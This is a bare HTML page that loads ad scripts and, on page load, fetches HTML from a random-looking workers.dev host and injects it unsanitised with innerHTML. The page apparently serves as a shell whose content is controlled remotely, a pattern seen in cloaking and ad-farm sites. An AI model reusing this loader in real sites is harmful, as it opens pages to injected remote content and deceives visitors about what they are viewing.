<html>
<head>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5833553467542153"
        crossorigin="anonymous"></script>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
        }
        #content {
            height: 100%;
            width: 100%;
        }
    </style>
</head>
<body>
    <div id="content"></div>

    <script>
        const targetURL = 'https://steep-forest-2970.blitzedzzontoppoihsblitzedzzontoppoihs.workers.dev/';
        const contentDiv = document.getElementById('content');

        async function fetchAndRender() {
            try {
                const response = await fetch(targetURL);
                if (response.ok) {
                    const html = await response.text();
                    contentDiv.innerHTML = html;
                } else {
                    console.error('Failed to fetch content:', response.status);
                    contentDiv.innerHTML = '<p>Failed to load content.</p>';
                }
            } catch (error) {
                console.error('Error fetching content:', error);
                contentDiv.innerHTML = '<p>Error loading content.</p>';
            }
        }

        fetchAndRender();
    </script>
</body>
</html>
